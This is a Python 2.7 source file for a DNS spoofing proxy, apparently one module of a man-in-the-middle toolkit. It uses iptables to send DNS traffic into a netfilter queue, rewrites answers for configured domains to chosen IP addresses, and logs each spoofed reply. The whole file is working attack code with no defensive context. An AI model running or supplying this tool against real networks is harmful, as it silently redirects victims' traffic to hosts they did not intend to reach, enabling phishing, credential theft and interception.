#!/usr/bin/python2.7 
 
from __future__ import print_function
import sys
import os
from scapy.all import * 
import netifaces
import DNSConf
import  threading
from netfilterqueue import NetfilterQueue

WARNING = '\033[91m'
END = '\033[0m'

class DnsProxy:
  def __init__(self, config, params):
        self.config = config
        self.params = params 
        self.t = threading.Thread(name='DNSspoof', target=self.dnsProxy)
        self.t.setDaemon(True)
        
  @staticmethod
  def forge_reply(pkt, qname, spoofed):
        ip = IP()
        udp = UDP()
        ip.src = pkt[IP].dst
        ip.dst = pkt[IP].src
        udp.sport = pkt[UDP].dport
        udp.dport = pkt[UDP].sport
        qd = pkt[UDP].payload
        dns = DNS(id = qd.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)
        dns.qd = qd[DNSQR]
        dns.an = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
        dns.ns = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
        dns.ar = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
        return(ip/udp/dns)

  def callback(self, packet):
            payload = packet.get_payload()
            pkt = IP(payload)
            spoofed = self.config.getIPFromDomain(pkt[DNS].qd.qname)
            if not pkt.haslayer(DNSQR):
                print("Port 53: Received something strange")
                packet.accept()
            else:
                if not spoofed:
                    print("DNS from: {} --> {}".format(pkt[IP].src, pkt[DNSQR].qname))
                    packet.accept()
                else:
                    new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofed))
                    packet.set_payload(str(new_pkt))
                    print("DNS from: {} --> {} \033[94mspoofed to \033[1m{}\033[0m".format(pkt[IP].src, pkt[DNSQR].qname, spoofed))
                    packet.accept()

  def dnsProxy(self):
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 4')   
        self.q = NetfilterQueue()
        self.q.bind(4, self.callback)
        self.q.run()

  def go(self):
        self.t.start()
        print ('\033[92m[+]\tStarting DNS proxy\033[0m')

  def stop(self):
        self.q.unbind()
        print ('\033[94m[-]\tStopping DNS proxy\033[0m')